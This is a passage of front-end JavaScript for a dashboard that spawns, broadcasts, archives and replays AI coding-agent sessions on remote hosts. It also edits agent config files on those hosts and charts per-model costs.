    const host_id = $('spawn-host').value;
    if (!host_id) { alert('no host selected'); return; }
    const cwd = $('spawn-cwd').value || '~';
    const prompt = $('spawn-prompt').value;
    // vt-0102: send generic spawn payload. Server forwards structured fields
    // to the daemon, which picks the backend (vt-0096) and builds argv there.
    // Falls back to legacy args-passthrough if user typed extras in ARGS.
    const body = {
      host_id, cwd,
      agent: ($('spawn-agent') && $('spawn-agent').value) || 'claude',
      model:             $('spawn-model').value.trim() || undefined,
      system_prompt:     $('spawn-system').value.trim() || undefined,
      allowed_tools:     $('spawn-tools').value.trim()  || undefined,
      resume_session_id: $('spawn-resume').value.trim() || undefined,
      dangerous:         $('spawn-dangerous').checked || undefined,
      args:              parseArgs($('spawn-args').value),
    };
    btn.disabled = true;
    try {
      const r = await api('POST', '/sessions', body);
      await refresh();
      attachSession(r.session_id);
      // Prompt is sent over PTY stdin once daemon reports session running.
      if (prompt) sendPromptOnReady(r.session_id, prompt);
    } catch (e) {
      alert('spawn failed: ' + e.message);
    } finally {
      btn.disabled = false;
    }
  }
  async function sendPromptOnReady(sessionId, prompt) {
    const deadline = Date.now() + 5000;
    while (Date.now() < deadline) {
      try {
        const s = await api('GET', '/sessions/' + sessionId);
        if (s.status === 'running') {
          // Append newline so claude submits the prompt as a complete line.
          await api('POST', `/sessions/${sessionId}/input`, { data: prompt + '\n' });
          return;
        }
        if (s.status === 'exited' || s.status === 'killed') return;
      } catch {}
      await new Promise(r => setTimeout(r, 200));
    }
  }
  function wireSpawn() {
    $('spawn-btn').onclick = spawn;
    $('spawn-args').addEventListener('keydown', (e) => {
      if (e.key === 'Enter') spawn();
    });
    $('show-closed').addEventListener('change', render);
    $('cleanup-btn').onclick = async () => {
      const cb = $('cleanup-btn');
      if (cb.disabled) return;
      if (!confirm('delete all exited/killed sessions older than 1h? this is permanent.')) return;
      cb.disabled = true;
      try {
        const r = await api('POST', '/sessions/cleanup', { older_than: '1 hour' });
        await refresh();
        alert(`deleted ${r.deleted} session(s)`);
      } catch (e) { alert('cleanup failed: ' + e.message); }
      finally { cb.disabled = false; }
    };
    $('bcast-btn').onclick = async () => {
      const bb = $('bcast-btn');
      if (bb.disabled) return;
      const tag = $('spawn-tag').value.trim();
      const groupId = $('spawn-group').value;
      const groupName = groupId ? state.groups.find(g => g.id === groupId)?.name : null;
      if (!tag && !groupName) { alert('group or tag required'); return; }
      const cwd = $('spawn-cwd').value || '~';
      const args = parseArgs($('spawn-args').value);
      const body = { cwd, args, label: 'bcast:' + (groupName || tag) };
      if (groupName) body.group = groupName; else body.tag = tag;
      bb.disabled = true;
      try {
        const r = await api('POST', '/broadcast', body);
        await refresh();
        alert(`spawned ${r.count} sessions${r.results.some(x => !x.ok) ? ' (some failed, see console)' : ''}`);
        console.log('broadcast results:', r.results);
      } catch (e) { alert('broadcast failed: ' + e.message); }
      finally { bb.disabled = false; }
    };
  }

  // ============ Host detail ============
  function openHostDetail(hostId) {
    const h = state.hosts.find(x => x.id === hostId);
    if (!h) return;
    state.selectedHost = hostId;
    state.selected = null;
    setViewMode('host');
    render();
    renderHostDetail(h);
  }

  function renderHostDetail(h) {
    $('hd-display').textContent = h.display_name || h.name;
    $('hd-name').textContent = h.name;
    $('hd-os').textContent = h.os || '—';
    $('hd-arch').textContent = h.arch || '—';
    $('hd-status').textContent = h.status;
    $('hd-status').className = 'val ' + (h.status === 'online' ? 'val-ok' : 'val-danger');
    $('hd-dver').textContent = h.daemon_version || '—';
    $('hd-cver').textContent = h.claude_version || '—';
    $('hd-seen').textContent = h.last_seen ? ageStr(h.last_seen) + ' ago' : '—';
    const meta = h.metadata || {};
    $('hd-node').textContent = meta.node_version || '—';
    $('hd-cpu').textContent = meta.cpu_model || '—';
    $('hd-cores').textContent = meta.cpu_cores || '—';
    $('hd-ram').textContent = meta.ram_total_bytes
      ? `${(meta.ram_total_bytes / 1024 ** 3).toFixed(1)} GiB` + (meta.ram_free_bytes ? ` (${(meta.ram_free_bytes / 1024 ** 3).toFixed(1)} free)` : '')
      : '—';
    $('hd-uptime').textContent = meta.uptime_seconds
      ? humanSeconds(meta.uptime_seconds) : '—';
    $('hd-hostname').textContent = meta.hostname || '—';

    // tags
    const tagsEl = $('hd-tags');
    const caps = h.capabilities || [];
    tagsEl.innerHTML = caps.length === 0
      ? `<span class="lbl" style="color:var(--text-faint)">no tags</span>`
      : caps.map((c, i) => `<span class="chip">${esc(c)}<button data-rm-tag="${i}">×</button></span>`).join('');
    tagsEl.querySelectorAll('button[data-rm-tag]').forEach(btn => {
      btn.onclick = async () => {
        const newCaps = caps.filter((_, i) => i !== Number(btn.dataset.rmTag));
        await patchHost(h.id, { capabilities: newCaps });
      };
    });

    // sessions for this host
    const ul = $('hd-sessions');
    const list = state.sessions.filter(s => s.host_id === h.id).slice(0, 20);
    ul.innerHTML = list.length === 0
      ? `<li class="empty"><span class="dot off"></span><span class="sess-id" style="color:var(--text-faint)">no sessions</span><span></span><span></span></li>`
      : list.map(s => {
          const icon = { running:'▶', exited:'◇', killed:'✕', orphaned:'?', pending:'·' }[s.status] || '·';
          return `<li data-session="${s.id}">
            <span class="dot ${dotClass(s.status, 'session')}"></span>
            <span class="sess-id">${icon} ${short(s.id)}</span>
            <span class="sess-host">${s.status}</span>
            <span class="sess-age">${ageStr(s.started_at)}</span>
          </li>`;
        }).join('');
    ul.querySelectorAll('li[data-session]').forEach(li => {
      li.onclick = () => attachSession(li.dataset.session);
    });

    // vt-0150: per-agent edit buttons — one per installed backend.
    renderHostEditButtons(h);
    $('hd-close-detail').onclick = () => {
      if (window.stopHostMetrics) window.stopHostMetrics();
      state.selectedHost = null;
      setViewMode('session');
      render();
    };
    // editable display_name
    $('hd-display').onblur = async () => {
      const v = $('hd-display').textContent.trim();
      if (v === (h.display_name || h.name)) return;
      await patchHost(h.id, { display_name: v || null });
    };
    $('hd-display').onkeydown = (e) => {
      if (e.key === 'Enter') { e.preventDefault(); $('hd-display').blur(); }
    };
    // tag input
    const inp = $('hd-tag-input');
    inp.value = '';
    inp.onkeydown = async (e) => {
      if (e.key !== 'Enter') return;
      const v = inp.value.trim();
      if (!v) return;
      const updated = Array.from(new Set([...(h.capabilities || []), v]));
      await patchHost(h.id, { capabilities: updated });
      inp.value = '';
    };
    // groups
    renderHostGroups(h);
    // live metrics + inventory tabs (guards same-host re-render churn)
    if (window.startHostMetrics) window.startHostMetrics(h.id);
  }

  // vt-0150: per-agent edit buttons. Read host.installed_backends (jsonb
  // map: name → version), cross-reference with state.backendConfigs (fetched
  // once from /api/fleet/backend-configs), render one button per editable
  // file. Dedupe AGENTS.md when both codex+opencode are installed.
  let _backendConfigsPromise = null;
  async function getBackendConfigs() {
    if (state.backendConfigs) return state.backendConfigs;
    if (!_backendConfigsPromise) {
      _backendConfigsPromise = api('GET', '/fleet/backend-configs')
        .then(m => { state.backendConfigs = m; return m; })
        .catch(() => ({ claude: [
          { name: 'CLAUDE.md',     label: 'CLAUDE.md' },
          { name: 'settings.json', label: 'settings.json' },
        ]}));
    }
    return _backendConfigsPromise;
  }
  async function renderHostEditButtons(h) {
    const container = $('hd-edit-buttons');
    if (!container) return;
    container.textContent = '';
    const installed = h.installed_backends || {};
    const installedKeys = Object.keys(installed).filter(k => installed[k]);
    const cfgMap = await getBackendConfigs();
    const seen = new Set();
    const entries = [];
    for (const backend of installedKeys) {
      const files = cfgMap[backend] || [];
      for (const f of files) {
        if (seen.has(f.name)) continue;
        seen.add(f.name);
        entries.push(f);
      }
    }
    // Legacy fallback ONLY for pre-vt-0150 daemons (no installed_backends
    // sent at all). Hosts that DO speak vt-0150 but have no claude
    // installed must not fall through to the claude pair — clicking the
    // legacy button would 403 on the daemon allowlist.
    if (!entries.length && !installedKeys.length) {
      const claude = cfgMap.claude || [];
      for (const f of claude) entries.push(f);
    }
    for (const f of entries) {
      const btn = document.createElement('button');
      btn.className = 'btn-ghost';
      btn.textContent = 'edit ' + (f.label || f.name);
      btn.onclick = () => openEditor(h.id, f.name);
      container.appendChild(btn);
      container.appendChild(document.createTextNode(' '));
    }
  }

  async function renderHostGroups(h) {
    // Lazy-load groups if we don't have them
    if (!state.groups.length) {
      try { state.groups = await api('GET', '/groups'); } catch {}
    }
    const memberGroups = state.groups.filter(g => (g.host_ids || []).includes(h.id));
    const nonMember = state.groups.filter(g => !(g.host_ids || []).includes(h.id));
    const el = $('hd-groups');
    el.innerHTML = memberGroups.length === 0
      ? `<span class="lbl" style="color:var(--text-faint)">not in any group</span>`
      : memberGroups.map(g => {
        const safeColor = safeCssColor(g.color);
        const accent = safeColor ? `style="border-color:${esc(safeColor)};color:${esc(safeColor)}"` : '';
        return `<span class="chip" ${accent}>${esc(g.name)}<button data-rm-group="${g.id}">×</button></span>`;
      }).join('');
    el.querySelectorAll('button[data-rm-group]').forEach(btn => {
      btn.onclick = async () => {
        await fetch(`/api/fleet/groups/${btn.dataset.rmGroup}/hosts/${h.id}`, {
          method: 'DELETE', headers: { authorization: 'Bearer ' + state.token },
        });
        state.groups = await api('GET', '/groups');
        renderHostGroups(h);
      };
    });
    // Inherited tags from groups (read-only display)
    const ihEl = $('hd-inherited');
    if (ihEl) {
      ihEl.innerHTML = '';
      const inherited = h.inherited_labels || {};
      let count = 0;
      for (const [groupName, labels] of Object.entries(inherited)) {
        for (const l of (labels || [])) {
          count++;
          const chip = document.createElement('span');
          chip.className = 'chip chip-inherited';
          const fromText = window.fleetI18n
            ? window.fleetI18n.t('host.inherited.from', { group: groupName })
            : `from: ${groupName}`;
          chip.innerHTML = `${esc(l)} <span class="chip-source">[${esc(fromText)}]</span>`;
          ihEl.appendChild(chip);
        }
      }
      if (!count) ihEl.innerHTML = `<span class="lbl" style="color:var(--text-faint)">none</span>`;
    }
  }

  async function patchHost(hostId, patch) {
    try {
      const r = await fetch('/api/fleet/hosts/' + hostId, {
        method: 'PATCH',
        headers: { 'authorization': 'Bearer ' + state.token, 'content-type': 'application/json' },
        body: JSON.stringify(patch),
      });
      if (!r.ok) throw new Error('HTTP ' + r.status);
      const updated = await r.json();
      // replace in state
      const idx = state.hosts.findIndex(x => x.id === hostId);
      if (idx >= 0) state.hosts[idx] = updated;
      render();
      if (state.viewMode === 'host' && state.selectedHost === hostId) renderHostDetail(updated);
    } catch (e) { alert('patch failed: ' + e.message); }
  }

  // ============ File editor ============
  async function openEditor(hostId, filePath) {
    const host = state.hosts.find(h => h.id === hostId);
    if (!host) return;
    if (host.status !== 'online') { alert(`host ${host.name} is offline`); return; }
    $('editor').hidden = false;
    $('editor-path').textContent = filePath;
    $('editor-host').textContent = host.name;
    $('editor-content').value = '';
    $('editor-content').disabled = true;
    $('editor-status').textContent = 'loading…';
    try {
      const r = await api('GET', `/hosts/${hostId}/file?path=${encodeURIComponent(filePath)}`);
      $('editor-content').value = r.content || '';
      $('editor-status').textContent = r.exists ? `loaded ${(r.content || '').length} bytes` : 'file does not exist (will create on save)';
    } catch (e) {
      $('editor-status').textContent = 'load failed: ' + e.message;
    } finally {
      $('editor-content').disabled = false;
      $('editor-content').focus();
    }
    $('editor-cancel').onclick = () => { $('editor').hidden = true; };
    $('editor-save').onclick = async () => {
      $('editor-save').disabled = true;
      $('editor-status').textContent = 'saving…';
      try {
        const r = await fetch('/api/fleet/hosts/' + hostId + '/file', {
          method: 'PUT',
          headers: { 'authorization': 'Bearer ' + state.token, 'content-type': 'application/json' },
          body: JSON.stringify({ path: filePath, content: $('editor-content').value }),
        });
        if (!r.ok) throw new Error('HTTP ' + r.status);
        const j = await r.json();
        $('editor-status').textContent = `saved ${j.bytes} bytes`;
        setTimeout(() => { $('editor').hidden = true; }, 600);
      } catch (e) {
        $('editor-status').textContent = 'save failed: ' + e.message;
      } finally {
        $('editor-save').disabled = false;
      }
    };
  }

  // ============ Routing (hash-based) ============
  // Routes: #/dashboard (default), #/archive, #/sessions/:id, #/cost
  function currentRoute() {
    const h = location.hash || '#/dashboard';
    const parts = h.replace(/^#\/?/, '').split('/');
    return { name: parts[0] || 'dashboard', arg: parts[1] || null };
  }
  function navigate(path) { if (location.hash !== '#' + path) location.hash = path; else applyRoute(); }

  // Route → page descriptor. Each entry: panels (ids to show), nav (highlighted button),
  // title (i18n key), open (handler). panels/title may be functions of `arg` for parametric routes.
  const PAGES = {
    dashboard:       { panels: [],                    nav: 'dashboard', title: 'page.dashboard',       open: () => {} },
    archive:         { panels: ['archive'],           nav: 'archive',   title: 'page.archive',         open: () => openArchive() },
    sessions:        { panels: ['sdetail'],           nav: 'archive',   title: 'page.session_detail',  open: arg => openSessionDetail(arg) },
    cost:            { panels: ['costview'],          nav: 'cost',      title: 'page.cost',            open: () => openCostView() },
    groups:          { panels: ['groupsview'],        nav: 'groups',    title: 'page.groups',          open: () => openGroupsView() },
    workflows:       { panels: arg => arg ? ['workfloweditor'] : ['workflowsview'],
                       nav: 'workflows',
                       title: arg => arg ? 'page.workflow_editor' : 'page.workflows',
                       open: arg => arg ? window.openWorkflowEditor?.(arg) : window.openWorkflowsList?.() },
    'workflow-runs': { panels: ['workflowrunviewer'], nav: 'workflows', title: 'page.workflow_run',    open: arg => window.openWorkflowRunViewer?.(arg) },
    prices:          { panels: ['pricesview'],        nav: 'prices',    title: 'page.prices',          open: () => window.openPricesView?.() },
    vault:           { panels: ['vaultview'],         nav: 'vault',     title: 'page.vault',           open: () => window.openVaultView?.() },
    health:          { panels: ['healthview'],        nav: 'health',    title: 'page.health',          open: () => openHealthView() },
    audit:           { panels: ['auditview'],         nav: 'audit',     title: 'page.audit',           open: () => openAuditView() },
    'recycle-bin':   { panels: ['recyclebinview'],    nav: 'groups',    title: 'page.recycle_bin',     open: () => window.openRecycleBinView?.() },
    'agent-roles':   { panels: ['agentrolesview'],    nav: 'agent-roles', title: 'page.agent_roles',   open: () => window.openAgentRolesView?.() },
  };
  const ALL_PANELS = ['archive','sdetail','costview','groupsview','workflowsview','workfloweditor','workflowrunviewer','pricesview','vaultview','healthview','auditview','recyclebinview','agentrolesview'];
  const ALL_NAVS = ['dashboard','archive','cost','groups','workflows','prices','vault','health','audit','agent-roles'];
  // vt-0312: feature-flag map. Nav buttons + page routes are hidden
  // when their feature is `enabled=false`. Map from feature name →
  // nav id(s). `null` means "core, never gated".
  const NAV_FEATURE = {
    dashboard: null,
    archive: 'fleet',
    cost: 'tokmon',
    groups: 'fleet',
    workflows: 'workflows',
    prices: 'tokmon',
    vault: 'vault_rag',
    health: null,
    audit: 'audit',
    'agent-roles': 'agent_roles',
  };
  let _featureMap = {};  // populated by loadFeatures(); default empty → all visible

  function setPage(name, arg) {
    const p = PAGES[name] || PAGES.dashboard;
    // vt-0377: feature-flag deep-link race guard — if the operator hits a
    // feature-gated route before loadFeatures() resolves, the route would
    // mount + fire its API calls before applyFeatureGates() can redirect.
    // Refuse synchronously when the flag is known-false.
    const featureKey = NAV_FEATURE[name];
    if (featureKey && _featureMap[featureKey] === false) {
      if (name !== 'dashboard') return setPage('dashboard', arg);
    }
    ALL_PANELS.forEach(id => { const el = $(id); if (el) el.hidden = true; });
    const panels = typeof p.panels === 'function' ? p.panels(arg) : p.panels;
    panels.forEach(id => { const el = $(id); if (el) el.hidden = false; });
    ALL_NAVS.forEach(n => {
      const el = $('nav-' + n); if (el) el.classList.toggle('active-nav', n === p.nav);
    });
    const tk = typeof p.title === 'function' ? p.title(arg) : p.title;
    const titleEl = $('app-title');
    if (titleEl) {
      titleEl.dataset.i18n = tk;
      titleEl.textContent = window.fleetI18n ? window.fleetI18n.t(tk) : tk;
    }
    p.open(arg);
  }
  function applyRoute() {
    const r = currentRoute();
    setPage(r.name, r.arg);
  }
  window.addEventListener('hashchange', applyRoute);
  // Re-render dynamic content when language changes (inspector innerHTML etc.).
  window.addEventListener('fleet-langchange', () => applyRoute());

  // vt-0312: poll feature flags + gate the nav. 60s cadence — fast
  // enough that toggling a flag in /fleet/features is visible to all
  // tabs within a minute, slow enough not to thrash.
  // vt-0317: back off + surface 401 instead of silent silently-retry-
  // every-60s. On 401 we skip polling entirely until the api()
  // helper's re-auth dialog re-fills state.token.
  let _featuresAuthLost = false;
  async function loadFeatures() {
    if (_featuresAuthLost) return;
    // Skip when token not yet read from localStorage. Without this
    // the top-level loadFeatures() at module load fires `Bearer null`
    // before boot()→readToken() runs, gets 401, sets _featuresAuthLost
    // forever and the 60s polling never resumes for the rest of the
    // session.
    if (!state.token) return;
    try {
      const r = await fetch('/api/fleet/features', {
        headers: { authorization: 'Bearer ' + state.token },
      });
      if (r.status === 401) {
        _featuresAuthLost = true;
        console.warn('[features] auth lost — polling paused until token refresh');
        return;
      }
      if (!r.ok) return;
      const rows = await r.json();
      const next = {};
      for (const f of rows) next[f.name] = !!f.enabled;
      _featureMap = next;
      applyFeatureGates();
    } catch { /* silent — non-critical */ }
  }
  // Re-enable polling whenever the operator pastes a fresh token
  // (api()'s inputDialog flow writes state.token directly).
  window.addEventListener('storage', (ev) => {
    if (ev.key === 'fleetToken') { _featuresAuthLost = false; loadFeatures(); }
  });
  function applyFeatureGates() {
    for (const [navId, featureKey] of Object.entries(NAV_FEATURE)) {
      const el = $('nav-' + navId);
      if (!el) continue;
      const hidden = featureKey && _featureMap[featureKey] === false;
      el.hidden = !!hidden;
    }
    // If the currently-displayed page is for a feature that just got
    // disabled, kick the user back to /dashboard so they don't sit on
    // a half-broken view.
    const r = currentRoute();
    const featureKey = NAV_FEATURE[r.name];
    if (featureKey && _featureMap[featureKey] === false && r.name !== 'dashboard') {
      navigate('/dashboard');
    }
  }
  // Initial load + periodic refresh. The bootstrap call here is a
  // no-op until boot()→readToken() populates state.token (see guard
  // in loadFeatures); boot() re-invokes it explicitly after auth.
  loadFeatures();
  setInterval(loadFeatures, 60_000);
  // Expose for boot() so it can fire the real first load post-auth.
  window.__fleetLoadFeatures = loadFeatures;

  // ============ Archive ============
  let archiveState = { offset: 0, limit: 50, filter: {}, total: 0 };
  async function openArchive() {
    // populate host filter once
    const sel = $('ar-host');
    sel.innerHTML = '<option value="">any</option>' +
      state.hosts.map(h => `<option value="${h.id}">${esc(h.display_name || h.name)}</option>`).join('');
    $('ar-apply').onclick = () => { archiveState.offset = 0; loadArchive(); };
    $('ar-reset').onclick = () => {
      ['ar-q','ar-since','ar-until'].forEach(id => $(id).value = '');
      ['ar-host','ar-status'].forEach(id => $(id).value = '');
      archiveState.offset = 0; loadArchive();
    };
    $('ar-prev').onclick = () => {
      archiveState.offset = Math.max(0, archiveState.offset - archiveState.limit);
      loadArchive();
    };
    $('ar-next').onclick = () => {
      if (archiveState.offset + archiveState.limit < archiveState.total) {
        archiveState.offset += archiveState.limit;
        loadArchive();
      }
    };
    $('archive-close').onclick = () => navigate('/dashboard');
    loadArchive();
  }
  async function loadArchive() {
    const params = new URLSearchParams({ with_count: '1', limit: archiveState.limit, offset: archiveState.offset });
    const filters = {
      q:        $('ar-q').value.trim(),
      host_id:  $('ar-host').value,
      status:   $('ar-status').value,
      since:    $('ar-since').value ? new Date($('ar-since').value).toISOString() : '',
      until:    $('ar-until').value ? new Date($('ar-until').value).toISOString() : '',
    };
    for (const [k, v] of Object.entries(filters)) if (v) params.set(k, v);
    archiveState.filter = filters;
    try {
      const r = await api('GET', '/sessions?' + params.toString());
      archiveState.total = r.total;
      renderArchive(r.rows);
      $('archive-count').textContent = `${r.total} sessions`;
      const end = Math.min(archiveState.offset + r.rows.length, r.total);
      $('ar-page').textContent = `${archiveState.offset + 1}–${end} of ${r.total}`;
      $('ar-prev').disabled = archiveState.offset === 0;
      $('ar-next').disabled = end >= r.total;
    } catch (e) { console.warn('archive load', e); }
  }
  function renderArchive(rows) {
    const body = $('ar-rows');
    body.innerHTML = rows.length === 0
      ? '<tr><td colspan="8" style="text-align:center; padding:2em; color:var(--text-faint)">no sessions match</td></tr>'
      : rows.map(s => {
          const host = state.hosts.find(h => h.id === s.host_id);
          const ts = new Date(s.started_at);
          const exitTag = s.exit_code != null ? ` exit=${s.exit_code}` : '';
          const labelText = (s.label || '') + (s.notes ? ` — ${s.notes.replace(/\n.*/, '')}` : '');
          return `<tr class="row-clickable" data-sid="${s.id}">
            <td class="nowrap">${ts.toLocaleString()}</td>
            <td class="sess-id-cell">${short(s.id)}</td>
            <td>${esc(host?.display_name || host?.name || '?')}</td>
            <td class="nowrap">${s.status}${exitTag}</td>
            <td class="cwd-cell" title="${esc(s.cwd || '')}">${esc(s.cwd || '—')}</td>
            <td class="label-cell" title="${esc(labelText)}">${esc(labelText || '—')}</td>
            <td class="nowrap" id="cost-${s.id.slice(0,8)}">—</td>
          </tr>`;
        }).join('');
    body.querySelectorAll('tr[data-sid]').forEach(tr => {
      tr.onclick = () => navigate('/sessions/' + tr.dataset.sid);
    });
    // Batch cost lookup: 1 POST instead of N concurrent GETs (was a perf hot
    // spot under load — see audit §6.1).
    if (rows.length) {
      api('POST', '/sessions/cost-batch', { ids: rows.map(s => s.id) })
        .then(map => {
          for (const s of rows) {
            const el = document.getElementById('cost-' + s.id.slice(0, 8));
            if (!el) continue;
            const c = map[s.id];
            if (!c) { el.textContent = '—'; continue; }
            const tag = c.attribution === 'approximate' ? '~' : '';
            el.textContent = c.usd ? `$${c.usd.toFixed(4)}${tag}` : '—';
          }
        }).catch(() => {});
    }
  }

  async function rerunSession(sid) {
    try {
      const s = await api('GET', `/sessions/${sid}`);
      if (!confirm(`Rerun session on ${state.hosts.find(h=>h.id===s.host_id)?.name}?\nargs: ${JSON.stringify(s.args)}`)) return;
      const r = await api('POST', '/sessions', {
        host_id: s.host_id, cwd: s.cwd, args: s.args, env: s.env || {},
        label: 'rerun: ' + (s.label || short(sid)),
        metadata: { rerun_of: sid },
      });
      navigate('/dashboard');
      setTimeout(() => attachSession(r.session_id), 200);
    } catch (e) { alert('rerun failed: ' + e.message); }
  }

  // ============ Session detail ============
  async function openSessionDetail(sid) {
    $('sd-id').textContent = short(sid);
    $('sd-host').textContent = '…'; $('sd-status').textContent = '…';
    $('sd-by').textContent = '—'; $('sd-started').textContent = '—'; $('sd-ended').textContent = '—';
    $('sd-exit').textContent = '—'; $('sd-cwd').textContent = '—'; $('sd-pid').textContent = '—';
    $('sd-args').textContent = '—'; $('sd-notes').value = ''; $('sd-cost').textContent = '—';
    $('sd-transcript').textContent = 'loading…';
    $('sd-timeline').innerHTML = '';
    $('sd-close').onclick = () => history.length > 1 ? history.back() : navigate('/archive');
    $('sd-attach').onclick = () => { navigate('/dashboard'); setTimeout(() => attachSession(sid), 200); };
    $('sd-rerun').onclick  = () => rerunSession(sid);
    $('sd-save-notes').onclick = async () => {
      try {
        await fetch('/api/fleet/sessions/' + sid, {
          method: 'PATCH',
          headers: { 'authorization': 'Bearer ' + state.token, 'content-type': 'application/json' },
          body: JSON.stringify({ notes: $('sd-notes').value }),
        });
        $('sd-save-notes').textContent = 'saved ✓';
        setTimeout(() => { $('sd-save-notes').textContent = 'save notes'; }, 1500);
      } catch (e) { alert('save failed: ' + e.message); }
    };
    document.querySelectorAll('.sd-tab').forEach(t => {
      t.onclick = () => {
        document.querySelectorAll('.sd-tab').forEach(x => x.classList.remove('active'));
        document.querySelectorAll('.sd-pane').forEach(x => x.classList.remove('active'));
        t.classList.add('active');
        document.getElementById('sd-tab-' + t.dataset.tab).classList.add('active');
      };
    });
    try {
      const s = await api('GET', '/sessions/' + sid);
      const host = state.hosts.find(h => h.id === s.host_id);
      $('sd-id').textContent = short(s.id);
      $('sd-host').textContent = host?.display_name || host?.name || short(s.host_id);
      $('sd-status').textContent = s.status;
      $('sd-by').textContent = s.created_by || '—';
      $('sd-started').textContent = new Date(s.started_at).toLocaleString();
      $('sd-ended').textContent = s.ended_at ? new Date(s.ended_at).toLocaleString() : '—';
      $('sd-exit').textContent = s.exit_code != null ? String(s.exit_code) : '—';
      $('sd-cwd').textContent = s.cwd || '—';
      $('sd-pid').textContent = s.pid != null ? s.pid : '—';
      $('sd-args').textContent = JSON.stringify(s.args || [], null, 2);
      $('sd-notes').value = s.notes || '';
    } catch (e) { $('sd-id').textContent = 'error'; $('sd-transcript').textContent = e.message; return; }
    // transcript — xterm replay (vt-0117) + plain fallback.
    try {
      // Init read-only xterm in #sd-transcript-term.
      const mount = $('sd-transcript-term');
      mount.innerHTML = '';
      if (state.sdTerm) { try { state.sdTerm.dispose(); } catch {} state.sdTerm = null; }
      const term = new Terminal({
        cursorBlink: false,
        disableStdin: true,
        fontFamily: '"JetBrains Mono", ui-monospace, monospace',
        fontSize: 12,
        lineHeight: 1.25,
        scrollback: 10000,
        allowProposedApi: true,
        theme: { background: '#0a0a0c', foreground: '#e8e6e1', cursor: 'transparent' },
      });
      const fit = new FitAddon.FitAddon();
      term.loadAddon(fit);
      term.open(mount);
      try { if (window.CanvasAddon && CanvasAddon.CanvasAddon) term.loadAddon(new CanvasAddon.CanvasAddon()); } catch {}
      try { if (window.Unicode11Addon && Unicode11Addon.Unicode11Addon) { term.loadAddon(new Unicode11Addon.Unicode11Addon()); term.unicode.activeVersion = '11'; } } catch {}
      requestAnimationFrame(() => { try { fit.fit(); } catch {} });
      state.sdTerm = term;
      // Fetch raw bytes and replay through term.write.
      const rb = await fetch('/api/fleet/sessions/' + sid + '/transcript.bin', {
        headers: { authorization: 'Bearer ' + state.token },
      });
      if (!rb.ok) throw new Error('HTTP ' + rb.status);
      const ab = await rb.arrayBuffer();
      term.write(new Uint8Array(ab));
      // Plain fallback (collapsed by default) for grep/copy use cases.
      const rt = await fetch('/api/fleet/sessions/' + sid + '/transcript.txt', {
        headers: { authorization: 'Bearer ' + state.token },
      });
      const t = await rt.text();
      $('sd-transcript').textContent = t || '(empty)';
    } catch (e) { $('sd-transcript').textContent = 'load failed: ' + e.message; }
    // timeline
    try {
      const tl = await api('GET', `/sessions/${sid}/timeline`);
      $('sd-timeline').innerHTML = tl.events.map(ev => `
        <li class="ev-${esc(ev.kind)}">
          <span class="ts">${new Date(ev.ts).toISOString()}</span>
          <span class="kind">${esc(ev.kind)}</span>
          <span class="detail">${ev.detail ? esc(JSON.stringify(ev.detail)) : ''}</span>
        </li>`).join('') || '<li class="lbl">no events</li>';
    } catch {}
    // cost
    try {
      const c = await api('GET', `/sessions/${sid}/cost`);
      const tag = c.attribution === 'approximate' ? ' ~' : '';
      $('sd-cost').innerHTML = `$${(c.usd || 0).toFixed(4)}${tag} · ${c.msgs} msgs` +
        (c.by_model ? '<br><small style="color:var(--text-dim)">' +
          Object.entries(c.by_model).map(([m, v]) => `${esc(m)}: $${v.usd.toFixed(4)} (in=${v.input_tokens}, out=${v.output_tokens})`).join('<br>') +
          '</small>' : '');
    } catch {}
  }

  // ============ Cost timeline view ============
  async function openCostView() {
    const days = parseInt($('cv-days').value, 10);
    const groupBy = $('cv-groupby').value;
    $('cv-days').onchange = openCostView;
    $('cv-groupby').onchange = openCostView;
    $('costview-close').onclick = () => navigate('/dashboard');
    let data;
    try { data = await api('GET', `/cost/timeline?days=${days}&group_by=${groupBy}`); }
    catch (e) { $('cv-summary').textContent = 'load failed: ' + e.message; return; }
    renderCostChart(data);
  }
  function renderCostChart(data) {
    const points = data.points || [];
    const groupBy = data.group_by || 'model';
    // For backward compat: if dim isn't present, fall back to model.
    const dimKey = (p) => p.dim != null ? p.dim : p.model;
    const dims = Array.from(new Set(points.map(dimKey)));
    const byDay = new Map();
    for (const p of points) {
      const d = new Date(p.day).toISOString().slice(0, 10);
      if (!byDay.has(d)) byDay.set(d, {});
      const k = dimKey(p);
      byDay.get(d)[k] = (byDay.get(d)[k] || 0) + p.usd;
    }
    const days = Array.from(byDay.keys()).sort();
    // summary
    const total = points.reduce((n, p) => n + p.usd, 0);
    const totalMsgs = points.reduce((n, p) => n + p.msgs, 0);
    const overlapNote = groupBy === 'group'
      ? `<div class="stat" style="color:var(--warn)"><span class="lbl">overlap</span><span class="val">hosts in multiple groups counted in each</span></div>`
      : '';
    $('cv-summary').innerHTML = `
      <div class="stat"><span class="lbl">${data.days}d total</span><span class="val val-warn">$${total.toFixed(2)}</span></div>
      <div class="stat"><span class="lbl">messages</span><span class="val">${totalMsgs}</span></div>
      <div class="stat"><span class="lbl">avg/day</span><span class="val">$${(total / Math.max(data.days, 1)).toFixed(2)}</span></div>
      <div class="stat"><span class="lbl">grouped by</span><span class="val">${groupBy} (${dims.length})</span></div>
      ${overlapNote}
    `;
    // chart
    const W = 1200, H = 320, PAD_L = 60, PAD_R = 30, PAD_T = 30, PAD_B = 50;
    const innerW = W - PAD_L - PAD_R, innerH = H - PAD_T - PAD_B;
    const max = Math.max(0.01, ...days.map(d => Object.values(byDay.get(d)).reduce((n, v) => n + v, 0)));
    const presetColors = { 'claude-opus-4-7': '#ff79c6', 'claude-sonnet-4-6': '#6fd5ff', 'claude-haiku-4-5': '#5cf08c' };
    const palette = ['#ff79c6','#6fd5ff','#5cf08c','#ffb547','#ff4d5e','#bbf3ff','#86ffac','#ffd07a','#ffaae0','#9be4ff'];
    const colorCache = new Map();
    function colorFor(k) {
      if (presetColors[k]) return presetColors[k];
      if (colorCache.has(k)) return colorCache.get(k);
      const c = palette[colorCache.size % palette.length];
      colorCache.set(k, c);
      return c;
    }
    const barW = innerW / Math.max(days.length, 1) * 0.7;
    const gap  = innerW / Math.max(days.length, 1);
    let svg = '';
    for (let i = 0; i <= 4; i++) {
      const y = PAD_T + innerH * (i / 4);
      const val = max * (1 - i / 4);
      svg += `<line x1="${PAD_L}" y1="${y}" x2="${W - PAD_R}" y2="${y}" stroke="#2a2832" stroke-dasharray="2,3"/>`;
      svg += `<text x="${PAD_L - 6}" y="${y + 4}" fill="#7a7575" font-family="JetBrains Mono" font-size="10" text-anchor="end">$${val.toFixed(2)}</text>`;
    }
    days.forEach((d, i) => {
